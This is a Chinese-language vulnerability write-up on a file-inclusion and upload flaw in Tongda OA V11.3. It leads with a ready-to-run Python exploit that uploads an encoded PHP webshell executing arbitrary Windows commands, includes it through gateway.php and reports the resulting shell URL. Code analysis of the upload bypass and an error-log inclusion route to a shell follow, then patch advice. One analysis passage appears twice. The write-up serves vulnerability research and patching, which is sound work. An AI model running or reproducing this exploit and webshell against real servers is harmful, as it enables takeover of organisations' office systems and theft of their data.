# 通达OA文件包含漏洞

[TOC]


# 漏洞利用  

脚本代码

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @userVersion : python 3.7
# @Author  : fsrm
# @Data    : 2020/3/18
# @Effect  : tongda_oa_file_include
# @Version : V1.0
import os
import sys
import requests
def tongda_oa_file_include_check(target_url):
    filename = "tongda_vul.php"
    webshell = '''<?php
            $fp = fopen('tongda_vul.php', 'w+');
            $a = base64_decode("JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==");
            fwrite($fp, urldecode($a));
            fclose($fp);
            ?>'''
    upload_url = target_url + "/ispirit/im/upload.php"
    include_url = target_url + "/ispirit/interface/gateway.php"
    shell_url = target_url + "/ispirit/interface/" + str(filename) + "?a=netstat -an"
    files = {'ATTACHMENT': webshell}
    upload_data = {"P": "123", "DEST_UID": "1", "UPLOAD_MODE": "2"}
    upload_res = requests.post(upload_url, upload_data, files=files, timeout=5)
    path = upload_res.text
    path = path[path.find('@') + 1:path.rfind('|')].replace("_", "\/").replace("|", ".")
    include_data = {"json": "{\"url\":\"/general/../../attach/im/" + path + "\"}"}
    include_res = requests.post(include_url, data=include_data, timeout=5)
    shell_res = requests.get(shell_url)
    if "ESTABLISHED" in shell_res.text:
        print("The target is vulnerable ")
        print("shell: "+shell_url)
    else:
        print("target is not vulnerable")

if __name__ == '__main__':
    if len(sys.argv)!=2:
        print("use python tongda_oa_file_include.py http://127.0.0.1")
        sys.exit()
    tongda_oa_file_include_check(sys.argv[1])


```

# 通达OA简介  
通达OA是由北京通达信科科技有限公司研发的一款通用型OA产品，涵盖了个人事务、行政办公、流程审批、知识管理、人力资源管理、组织机构管理等企业信息化管理功能。
本次复现环境是通达OAV11.3，文件上传漏洞为全版本通杀，文件包含漏洞/ispirit/interface/gateway.php只有V11.3版本存在。
# 漏洞分析环境  
下载OA软件地址：https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe
下载安装，配置访问端口为8080
![image](EA40430A0CDC46F7ABBE21653C6A985F)  
网站源码在安装目录的wwwroot目录下：   
![image](C00BFC8E88314DE181F8850DDCE3D715)    
源码经过zend 5.4加密    
# 文件上传漏洞分析  
根据官网发布的补丁，更新的是ispirit/im/upload.php这个文件，跟进这个文件

```

$P = $_POST["P"];
if (isset($P) || ($P != "")) {
  ob_start();
  include_once "inc/session.php";
  session_id($P);
  session_start();
  session_write_close();
}else {
  include_once "./auth.php";
}
```
当传入参数P且P不为空时，包含inc/session.php获取session，否则就会包含/auth.php进行用户认证。  
继续跟进upload.php，23行，29行，35行逻辑判断是否传入DEST_UID参数，若参数不存在或者值为0则退出。  

```

if (($DEST_UID != "") && !td_verify_ids($ids)) {
  $dataBack = array("status" => 0, "content" => "-ERR " . _("接收方ID无效"));
  echo json_encode(data2utf8($dataBack));+
  exit();
}

if (strpos($DEST_UID, ",") !== false) {
}
else {
  $DEST_UID = intval($DEST_UID);
}

if ($DEST_UID == 0) {
  if ($UPLOAD_MODE != 2) {
    $dataBack = array("status" => 0, "content" => "-ERR " . _("接收方ID无效"));
    echo json_encode(data2utf8($dataBack));
    exit();
  }
}
```
继续跟进upload.php，23行，29行，35行逻辑判断是否传入DEST_UID参数，若参数不存在或者值为0则退出。  

```

if (($DEST_UID != "") && !td_verify_ids($ids)) {
  $dataBack = array("status" => 0, "content" => "-ERR " . _("接收方ID无效"));
  echo json_encode(data2utf8($dataBack));+
  exit();
}

if (strpos($DEST_UID, ",") !== false) {
}
else {
  $DEST_UID = intval($DEST_UID);
}

if ($DEST_UID == 0) {
  if ($UPLOAD_MODE != 2) {
    $dataBack = array("status" => 0, "content" => "-ERR " . _("接收方ID无效"));
    echo json_encode(data2utf8($dataBack));
    exit();
  }
}
```
传入一个DEST_UID=2后，访问，提示无文件上传，进入文件上传逻辑。  
跟进upload.php的45行，1<=count($_FILES)判断是否有文件上传，如果上传包中存在文件则直接调用52行的upload()函数，否则直接退出。  

```
if (1 <= count($_FILES)) {
  if ($UPLOAD_MODE == "1") {
    if (strlen(urldecode($_FILES["ATTACHMENT"]["name"])) != strlen($_FILES["ATTACHMENT"]["name"])) {
      $_FILES["ATTACHMENT"]["name"] = urldecode($_FILES["ATTACHMENT"]["name"]);
    }
  }

  $ATTACHMENTS = upload("ATTACHMENT", $MODULE, false);

  if (!is_array($ATTACHMENTS)) {
    $dataBack = array("status" => 0, "content" => "-ERR " . $ATTACHMENTS);
    echo json_encode(data2utf8($dataBack));
    exit();
  }

  ob_end_clean();
  $ATTACHMENT_ID = substr($ATTACHMENTS["ID"], 0, -1);
  $ATTACHMENT_NAME = substr($ATTACHMENTS["NAME"], 0, -1);

  if ($TYPE == "mobile") {
    $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), "utf-8", MYOA_CHARSET);
  }
}
else {
  $dataBack = array("status" => 0, "content" => "-ERR " . _("无文件上传"));
  echo json_encode(data2utf8($dataBack));
  exit();
}
```
跟进uoload.php第82行，判断UPLOAD_MODE参数的取值，如果没有该参数，直接返回157行的内容，回包中没有路径和后台保存的文件名。  
当指定UPLOAD_MODE参数进行上传时，会回显ATTACHMENTS["ID"]和ATTACHMENTS["NAME"]两个变量拼接的字符串。ATTACHMENTS数组是52行上传文件成功upload函数返回的数组。  
跟进包含在inc/utility_file.php中第1665行的upload()函数，第1692行通过is_uploadable()函数对上传文件后缀名进行检测，跟进第2307行，判断上传文件"."后面三个字符是否是php，针对Windows可以使用".php."进行绕过上传。


```

function is_uploadable($FILE_NAME)
{
  $POS = strrpos($FILE_NAME, ".");

  if ($POS === false) {
    $EXT_NAME = $FILE_NAME;
  }
  else {
    if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == "php") {
      return false;
    }

    $EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));
  }
```
 第1715行，ATTACHMENTS[ID]由add_attach()函数返回。

```
if ($ERROR_DESC == "") {
  $ATTACH_NAME = str_replace("'", "", $ATTACH_NAME);
  $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);

  if ($ATTACH_ID === false) {
    $ERROR_DESC = sprintf(_("文件[%s]上传失败"), $ATTACH_NAME);
  }
  else {
    $ATTACHMENTS["ID"] .= $ATTACH_ID . ",";
    $ATTACHMENTS["NAME"] .= $ATTACH_NAME . "*";
  }
```
跟进add_attach()函数，1877行，上传文件保存的路径是attach目录下拼接upload.php文件中指定的$MODULE变量拼接$YM变量。  

```
$ATTACH_PARA_ARRAY = TD::get_cache("SYS_ATTACH_PARA");
  $ATTACH_POS_ACTIVE = $ATTACH_PARA_ARRAY["SYS_ATTACH_POS_ACTIVE"];
  $ATTACH_PATH_ACTIVE = $ATTACH_PARA_ARRAY["SYS_ATTACH_PATH_ACTIVE"];

  if (!file_exists($SOURCE_FILE)) {
    return false;
  }

  if ($MODULE == "") {
    $MODULE = attach_sub_dir();
  }

  if ($YM == "") {
    $YM = date("ym");
  }

  $PATH = $ATTACH_PATH_ACTIVE . $MODULE;
  if (!file_exists($PATH) || !is_dir($PATH)) {
    @mkdir($PATH, 448);
  }

  $PATH = $PATH . "/" . $YM;
  if (!file_exists($PATH) || !is_dir($PATH)) {
    @mkdir($PATH, 448);
  }
```
跟进1887行，保存的文件名  

```
 $FILENAME = $PATH . "/" . $ATTACH_ID . "." . $ATTACH_FILE;
```
跟进1926行，add_attach()函数返回ATTACH_ID_NEW变量  

```
$ATTACH_ID_NEW = $AID . "@" . $YM . "_" . $ATTACH_ID;  
```
至此，通过在upload.php文件指定UPLOAD_MODE变量的值为1，2，3都可以获取上传文件的路径和文件名  
开发者指定的保存路径不在webroot目录下面，只能通过文件包含漏洞进行包含触发漏洞。  
# 文件包含漏洞分析  
文件包含漏洞出现在/ispirit/interface/gateway.php，首先接从客户端接收一个$json的参数，然后将$json转换为数组后再转换成变量，当存在$json数据中存在一个key为url的且不为空的值时，并且url传入的数据中有general/或者ispirit/或者module/时，执行include_once包含该url。  
此处文件包含的另外一个利用，直接触发nginx的错误日志，利用文件包含直接getshell成功  
包含ngnix错误日志中的php代码  

# 漏洞修补建议  
下载官方补丁：http://www.tongda2000.com/news/673.php  
# 参考资料  
https://mp.weixin.qq.com/s/18sCWZsA4u7JYPIpiWBf_w

https://www.t00ls.net/viewthread.php?tid=55458&extra=&page=1